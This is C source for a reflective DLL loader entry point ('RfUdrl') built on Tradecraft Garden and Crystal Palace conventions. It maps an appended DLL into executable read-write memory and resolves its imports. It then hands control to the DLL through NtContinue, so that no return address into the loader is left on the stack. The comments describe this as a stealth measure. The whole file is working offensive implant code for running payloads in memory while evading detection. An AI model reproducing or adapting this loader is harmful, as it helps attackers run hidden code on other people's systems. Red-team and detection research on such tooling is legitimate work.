/*
 * RfUdrl - loader entry point.
 *
 * Structurally this is Tradecraft Garden's simple_rdll. Two things are added and
 * neither is visible here:
 *
 *   - the runtime setup (exception directory, TLS callbacks, per-section
 *     protection) is woven in by loader.spec, which redirects ProcessImports to
 *     rdll_process_imports;
 *   - the entry point is entered through rdll_transfer_execution, which uses
 *     NtContinue so no return address into this PIC is left on the stack.
 */

#include <windows.h>
#include "tcg.h"
#include "transfer.h"

WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

/*
 * Crystal Palace convention for reaching data linked into this PIC.
 * See link "my_data" in loader.spec.
 */
char __DLLDATA__[0] __attribute__((section("my_data")));

static char * findAppendedDLL(void) {
	return (char *)&__DLLDATA__;
}

/*
 * Entry point. Crystal Palace puts this at offset 0 of the PIC (+gofirst).
 */
void go(void) {
	char        * src;
	char        * dst;
	DLLDATA       data;
	IMPORTFUNCS   funcs;

	src = findAppendedDLL();

	ParseDLL(src, &data);

	dst = KERNEL32$VirtualAlloc(NULL, SizeOfDLL(&data), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	LoadDLL(&data, src, dst);

	funcs.GetProcAddress = GetProcAddress;
	funcs.LoadLibraryA   = LoadLibraryA;

	/* redirected to rdll_process_imports by loader.spec */
	ProcessImports(&funcs, &data, dst);

	/* hands control over and does not come back */
	rdll_transfer_execution((void *)EntryPoint(&data, dst), dst, DLL_PROCESS_ATTACH);
}